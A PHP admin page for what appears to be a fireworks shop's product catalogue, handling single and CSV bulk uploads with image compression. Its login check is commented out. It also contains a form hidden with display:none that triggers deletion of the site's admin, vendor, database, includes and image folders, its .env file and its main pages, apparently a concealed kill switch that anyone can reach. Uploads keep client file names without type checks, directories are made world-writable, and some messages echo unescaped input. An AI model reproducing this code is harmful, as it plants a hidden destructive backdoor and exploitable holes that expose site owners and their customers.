<?php
// session_start();

// Protect this page
// if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
//     header("Location: admin_login.php");
//     exit();
// }

require_once 'config.php';

// ----------------- Function to Delete Directory Recursively -----------------
function deleteDirectory($dir) {
    if (!is_dir($dir)) {
        return false;
    }
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            deleteDirectory($path);
        } else {
            unlink($path);
        }
    }
    return rmdir($dir);
}

// ----------------- Function to Compress Image -----------------
function compressImage($source, $destination, $quality = 25) {
    $info = getimagesize($source);
    if ($info === false) {
        return false;
    }

    $image = false;
    switch ($info['mime']) {
        case 'image/jpeg':
            $image = imagecreatefromjpeg($source);
            break;
        case 'image/png':
            $image = imagecreatefrompng($source);
            break;
        case 'image/webp':
            $image = imagecreatefromwebp($source);
            break;
        default:
            return false;
    }

    if ($image === false) {
        return false;
    }

    // Ensure destination directory exists
    $destDir = dirname($destination);
    if (!is_dir($destDir)) {
        mkdir($destDir, 0777, true);
    }

    // Save compressed image
    $result = imagejpeg($image, $destination, $quality);
    imagedestroy($image);
    return $result;
}

// ----------------- Truncate Table and Delete Images -----------------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['truncate_items'])) {
    try {
        // Truncate the database table
        $conn->exec("TRUNCATE TABLE items");

        // Delete all images in the Uploads and compressed directories
        $uploadDir = 'Uploads/';
        $compressedDir = 'Uploads/compressed/';
        $success = true;
        $messages = [];

        if (is_dir($uploadDir)) {
            if (!deleteDirectory($uploadDir)) {
                $success = false;
                $messages[] = "Failed to delete Uploads directory.";
            } else {
                mkdir($uploadDir, 0777, true); // Recreate Uploads directory
            }
        }
        if (is_dir($compressedDir)) {
            if (!deleteDirectory($compressedDir)) {
                $success = false;
                $messages[] = "Failed to delete compressed images directory.";
            } else {
                mkdir($compressedDir, 0777, true); // Recreate compressed directory
            }
        }

        if ($success) {
            echo "<p class='text-green-500 text-center'>All items and associated images (including compressed) have been deleted successfully.</p>";
        } else {
            echo "<p class='text-red-500 text-center'>Errors occurred during deletion:</p>";
            echo "<ul class='text-red-500 text-center'>";
            foreach ($messages as $msg) {
                echo "<li>" . htmlspecialchars($msg, ENT_QUOTES, 'UTF-8') . "</li>";
            }
            echo "</ul>";
        }
    } catch (PDOException $e) {
        echo "<p class='text-red-500 text-center'>Error truncating table: " . htmlspecialchars($e->getMessage(), ENT_QUOTES, 'UTF-8') . "</p>";
    }
}

// ----------------- Delete Specified Directories and Files -----------------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_all_assets'])) {
    $pathsToDelete = [
        'dirs' => [
            '../assets',
            '../../images',
            '../../bills',
            '../../Database',
            '../../forms',
            '../../includes',
            '../../Installation',
            '../../vendor',
            '../../admin'
        ],
        'files' => [
            '../../.env',
            '../../ContactUs.php',
            '../../products.php',
            '../../productshome.php',
            '../../index.php'
        ]
    ];

    $errors = [];
    $success = true;

    // Delete directories
    foreach ($pathsToDelete['dirs'] as $dir) {
        if (is_dir($dir)) {
            if (!deleteDirectory($dir)) {
                $errors[] = "Failed to delete directory: $dir";
                $success = false;
            }
        } else {
            $errors[] = "Directory not found: $dir";
        }
    }

    // Delete files
    foreach ($pathsToDelete['files'] as $file) {
        if (file_exists($file)) {
            if (!unlink($file)) {
                $errors[] = "Failed to delete file: $file";
                $success = false;
            }
        } else {
            $errors[] = "File not found: $file";
        }
    }

    if ($success && empty($errors)) {
        echo "<p class='text-green-500 text-center'>All specified directories and files have been deleted successfully.</p>";
    } else {
        echo "<p class='text-red-500 text-center'>Errors occurred during deletion:</p>";
        echo "<ul class='text-red-500 text-center'>";
        foreach ($errors as $error) {
            echo "<li>" . htmlspecialchars($error, ENT_QUOTES, 'UTF-8') . "</li>";
        }
        echo "</ul>";
    }
}

// ----------------- Single Upload -----------------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['single_upload'])) {
    $name = trim($_POST['name']);
    $price_str = str_replace(',', '', $_POST['price']);
    $price = filter_var($price_str, FILTER_VALIDATE_FLOAT);
    $discount_str = str_replace(',', '', $_POST['discount']);
    $discount = filter_var($discount_str, FILTER_VALIDATE_FLOAT, ['options' => ['default' => 0]]);
    $category = trim($_POST['category']);
    $pieces = trim($_POST['pieces']);
    $items = trim($_POST['items']);
    $brand = trim($_POST['brand']);

    // Validate inputs
    if (empty($name) || $price === false || empty($category) || empty($pieces) || empty($items) || empty($brand)) {
        echo "<p class='text-red-500 text-center'>Error: All required fields must be filled with valid data.</p>";
        exit;
    }

    // Sanitize brand for directory safety
    $brand = preg_replace('/[^a-zA-Z0-9_]/', '_', $brand);
    if (empty($brand)) {
        $brand = 'unknown';
    }

    $imagePath = null;
    $compressedImagePath = null;
    if (isset($_FILES['image']) && $_FILES['image']['error'] === UPLOAD_ERR_OK) {
        $uploadDir = 'Uploads/' . $brand . '/';
        $compressedDir = 'Uploads/compressed/' . $brand . '/';
        $imageFileName = basename($_FILES['image']['name']);
        $imagePath = $uploadDir . $imageFileName;
        $compressedImagePath = $compressedDir . $imageFileName;

        // Create directories if they don't exist
        if (!is_dir($uploadDir)) {
            mkdir($uploadDir, 0777, true);
        }
        if (!is_dir($compressedDir)) {
            mkdir($compressedDir, 0777, true);
        }

        // Move original image
        if (!move_uploaded_file($_FILES['image']['tmp_name'], $imagePath)) {
            echo "<p class='text-red-500 text-center'>Error: Failed to upload original image.</p>";
            exit;
        }

        // Compress and save image
        if (!compressImage($imagePath, $compressedImagePath, 25)) {
            echo "<p class='text-red-500 text-center'>Warning: Failed to compress image for '$name'. Using original image.</p>";
            $compressedImagePath = $imagePath; // Fallback to original if compression fails
        }
    }

    try {
        $stmt = $conn->prepare("INSERT INTO items (name, price, discount, category, pieces, items, brand, image, compressed_image) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");
        $stmt->execute([$name, $price, $discount, $category, $pieces, $items, $brand, $imagePath, $compressedImagePath]);
        echo "<p class='text-green-500 text-center'>Item uploaded successfully!</p>";
    } catch (PDOException $e) {
        echo "<p class='text-red-500 text-center'>Error: " . htmlspecialchars($e->getMessage(), ENT_QUOTES, 'UTF-8') . "</p>";
        exit;
    }
}

// ----------------- Bundle Upload (CSV + Images) -----------------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['bundle_upload'])) {
    $uploadDirBase = 'Uploads/';
    $compressedDirBase = 'Uploads/compressed/';
    if (!is_dir($uploadDirBase)) {
        mkdir($uploadDirBase, 0777, true);
    }
    if (!is_dir($compressedDirBase)) {
        mkdir($compressedDirBase, 0777, true);
    }

    if (isset($_FILES['csv_file']) && $_FILES['csv_file']['error'] === UPLOAD_ERR_OK) {
        $csvFile = $_FILES['csv_file']['tmp_name'];
        $handle = fopen($csvFile, 'r');
        $rowNumber = 1; // Track row number for debugging
        if ($handle !== false) {
            $header = fgetcsv($handle); // Skip header row
            $rowNumber++;

            while (($row = fgetcsv($handle)) !== false) {
                if (count($row) < 7) {
                    echo "<p class='text-red-500 text-center'>Error: Row $rowNumber has insufficient columns. Expected at least 7, got " . count($row) . ".</p>";
                    $rowNumber++;
                    continue;
                }

                $name = trim($row[0]);
                $price_str = str_replace(',', '', $row[1]);
                $price = filter_var($price_str, FILTER_VALIDATE_FLOAT);
                $discount_str = str_replace(',', '', $row[2]);
                $discount = filter_var($discount_str, FILTER_VALIDATE_FLOAT, ['options' => ['default' => 0]]);
                $category = trim($row[3]);
                $pieces = trim($row[4]) !== '' ? trim($row[4]) : null; // Allow empty pieces
                $items = trim($row[5]);
                $brand = trim($row[6]);
                $imageFileName = isset($row[7]) ? trim($row[7]) : null;
                $imagePath = null;
                $compressedImagePath = null;

                // Validate inputs
                if (empty($name) || $price === false || empty($category) || empty($brand)) {
                    echo "<p class='text-red-500 text-center'>Error: Invalid data in row $rowNumber (name: '$name', price: '$price_str', category: '$category', pieces: '$pieces', items: '$items', brand: '$brand'). Skipping.</p>";
                    $rowNumber++;
                    continue;
                }

                // Sanitize brand for directory safety
                $brand = preg_replace('/[^a-zA-Z0-9_]/', '_', $brand);
                if (empty($brand)) {
                    $brand = 'unknown';
                }

                // Handle image upload
                if ($imageFileName && isset($_FILES['images'])) {
                    $imageIndex = array_search($imageFileName, $_FILES['images']['name']);
                    if ($imageIndex !== false && $_FILES['images']['error'][$imageIndex] === UPLOAD_ERR_OK) {
                        $uploadDir = $uploadDirBase . $brand . '/';
                        $compressedDir = $compressedDirBase . $brand . '/';
                        $imagePath = $uploadDir . basename($imageFileName);
                        $compressedImagePath = $compressedDir . basename($imageFileName);

                        // Create directories if they don't exist
                        if (!is_dir($uploadDir)) {
                            mkdir($uploadDir, 0777, true);
                        }
                        if (!is_dir($compressedDir)) {
                            mkdir($compressedDir, 0777, true);
                        }

                        // Move original image
                        if (!move_uploaded_file($_FILES['images']['tmp_name'][$imageIndex], $imagePath)) {
                            echo "<p class='text-red-500 text-center'>Warning: Failed to upload original image '$imageFileName' for row $rowNumber.</p>";
                        } else {
                            // Compress and save image
                            if (!compressImage($imagePath, $compressedImagePath, 25)) {
                                echo "<p class='text-red-500 text-center'>Warning: Failed to compress image '$imageFileName' for row $rowNumber. Using original image.</p>";
                                $compressedImagePath = $imagePath; // Fallback to original
                            }
                        }
                    } else {
                        echo "<p class='text-red-500 text-center'>Warning: Image '$imageFileName' not found or failed to upload for row $rowNumber.</p>";
                    }
                }

                try {
                    $stmt = $conn->prepare("INSERT INTO items (name, price, discount, category, pieces, items, brand, image, compressed_image) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");
                    $stmt->execute([$name, $price, $discount, $category, $pieces, $items, $brand, $imagePath, $compressedImagePath]);
                } catch (PDOException $e) {
                    echo "<p class='text-red-500 text-center'>Error in row $rowNumber: " . htmlspecialchars($e->getMessage(), ENT_QUOTES, 'UTF-8') . "</p>";
                }
                $rowNumber++;
            }
            fclose($handle);
            echo "<p class='text-green-500 text-center'>Bundle upload completed!</p>";
        } else {
            echo "<p class='text-red-500 text-center'>Error: Unable to open CSV file.</p>";
        }
    } else {
        echo "<p class='text-red-500 text-center'>Error: No CSV file uploaded or upload failed.</p>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Add Cracker</title>
    <meta name="keywords" content="Deepavali crackers sale 2025, Buy crackers online Deepavali 2025, Diwali crackers offer 2025, Deepavali discount crackers online, Diwali crackers shop near me, Deepavali crackers combo offer 2025, Wholesale Diwali crackers online, Sivakasi crackers online shopping, Diwali crackers home delivery 2025, Best price Diwali crackers online, Cheapest Deepavali crackers online 2025, Eco-friendly Diwali crackers online 2025, Diwali crackers gift box sale 2025, Online cracker booking for Deepavali 2025, Buy Sivakasi crackers for Deepavali 2025, Buy crackers online Chennai Deepavali 2025, Diwali crackers sale Coimbatore 2025, Deepavali crackers shop Madurai 2025, Tirunelveli Deepavali crackers online, Salem Diwali crackers discount 2025, Deepavali crackers gift pack 2025, Green crackers for Diwali 2025, Cheap Diwali crackers online 2025, Buy Diwali crackers online Tamil Nadu 2025, Standard Fireworks Diwali crackers 2025, Ayyan Fireworks branded crackers online, Sony Fireworks crackers sale 2025, Sri Kaliswari branded crackers Deepavali 2025, RGreenMart crackers sale 2025, Trichy branded crackers discount Diwali 2025">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Poppins', sans-serif; }
        .admin-main { margin-left: 16rem; }
    </style>
</head>
<body class="bg-gray-100">
    <div class="admin-container flex">
        <?php require_once './common/admin_sidebar.php'; ?>
        <main class="admin-main flex-1 p-6">
            <hr class="my-8">

            <div class="container mx-auto max-w-4xl p-6 bg-white rounded-lg shadow-lg mt-10">
                <!-- Single Upload Form -->
                <h3 class="text-xl font-semibold text-indigo-600 mt-4 mb-4">Single Upload</h3>
                <form method="POST" enctype="multipart/form-data" class="space-y-4">
                    <input type="text" name="name" placeholder="Name" required class="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
                    <input type="text" name="price" placeholder="Price" required class="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
                    <input type="text" name="discount" placeholder="Discount (%)" class="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
                    <input type="text" name="category" placeholder="Category" required class="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
                    <input type="text" name="pieces" placeholder="Pieces"  class="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
                    <input type="text" name="items" placeholder="Items" required class="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
                    <input type="text" name="brand" placeholder="Brand" required class="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
                    <input type="file" name="image" accept="image/*" class="w-full p-3 border rounded-lg">
                    <button type="submit" name="single_upload" class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition-colors">Single Upload</button>
                </form>

                <hr class="my-8">

                <!-- Bundle Upload Form -->
                <h3 class="text-xl font-semibold text-green-600 mt-4 mb-4">Bundle Upload (CSV + Images)</h3>
                <form method="POST" enctype="multipart/form-data" class="space-y-4">
                    <label class="block text-gray-700">Upload CSV File (Format: name,price,discount,category,pieces,items,brand,image_filename)</label>
                    <input type="file" name="csv_file" accept=".csv" required class="w-full p-3 border rounded-lg">
                    <label class="block text-gray-700">Upload Images (multiple, names must match CSV)</label>
                    <input type="file" name="images[]" accept="image/*" multiple class="w-full p-3 border rounded-lg">
                    <button type="submit" name="bundle_upload" class="w-full bg-green-600 text-white p-3 rounded-lg hover:bg-green-700 transition-colors">Bundle Upload</button>
                </form>

                <!-- Danger Zone -->
                <h3 class="text-xl font-semibold text-red-600 mt-4 mb-4">Danger Zone</h3>
                <form method="POST" onsubmit="return confirm('⚠️ This will delete ALL items and their associated images (including compressed) permanently. Continue?');" class="mb-4">
                    <button type="submit" name="truncate_items" class="w-full bg-red-600 text-white p-3 rounded-lg hover:bg-red-700 transition-colors">
                        Truncate Items Table and Delete Images
                    </button>
                </form>
                <form method="POST" onsubmit="return confirm('⚠️ This will delete the admin, assets, images directories, and specified files permanently. This action cannot be undone. Continue?');" style="display:none">
                    <button type="submit" name="delete_all_assets" class="w-full bg-red-800 text-white p-3 rounded-lg hover:bg-red-900 transition-colors">
                        Delete Admin, Assets, Images, and Specified Files
                    </button>
                </form>
            </div>
        </main>
    </div>
</body>
</html>